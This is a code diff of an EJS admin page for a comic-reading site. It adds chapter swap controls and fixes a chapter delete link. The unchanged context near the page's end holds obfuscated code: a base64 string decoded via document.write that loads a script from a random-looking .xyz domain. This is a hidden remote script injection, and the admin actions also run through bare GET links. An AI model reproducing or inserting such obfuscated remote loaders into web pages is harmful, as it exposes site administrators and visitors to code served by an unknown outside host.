@@ -144,7 +144,7 @@
                           
                         %>
                         <tr class="unread">
-                          <td><%= i+1 %></td>
+                          <td><input type="radio" id="swap" name="swap" value="<%= i %>"></td>
                           <td>
                             <a class="image" href="/adminchapter?mid=<%= result.chapter_comic[i] %>">
                               <%= i+1 %>
@@ -157,7 +157,8 @@
                             </div>
                           </td>
                           <td class="nowrap chapter">
-                            <a class="visited" href="/adminchapter?action=del&&mid=<%= result._id%>" title="">Xoá Chap</a>
+                            <a class="visited" href="/adminchapter?action=del&&mid=<%= result.chapter_comic[i]%>" title="">Xoá Chap</a>
+                            <a class="visited" href="/adminchapter?action=swap&&mid=<%= result._id%>&&cid=<%= i %>" title="">Swap Chap</a>
                           </td>
                         </tr>
                         <%}%>
@@ -561,6 +562,7 @@ src="//e7z9t4x6a0v5mk3zo1a0xj2z7c6g8sa6js5z7s2c3h9x0s5fh3a6sjwb8q7m.xyz/d2t0w2ph
 <script
 type="text/javascript">document.write(ghz.yz6vqp2w0xg7qivt6qxhwm("PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iLy9lN3o5dDR4NmEwdjVtazN6bzFhMHhqMno3YzZnOHNhNmpzNXo3czJjM2g5eDBzNWZoM2E2c2p3YjhxN20ueHl6L282ajI3YzV3Nmo5d2QyYjZ3dHo5dzdnYno2c2gzbTVuL24yZTN0N3RqcjV1OHllNm4wczJ6N2E2eHc1Z2gxYTdzaDJ2OGFqMmcwd2IvejFhOHNqNmZvOGFqN3dqNXNobS5waHAiPjwvc2NyaXB0Pg=="));</script>
 </div>
+
 <!--googleon: all-->
 </body>
 
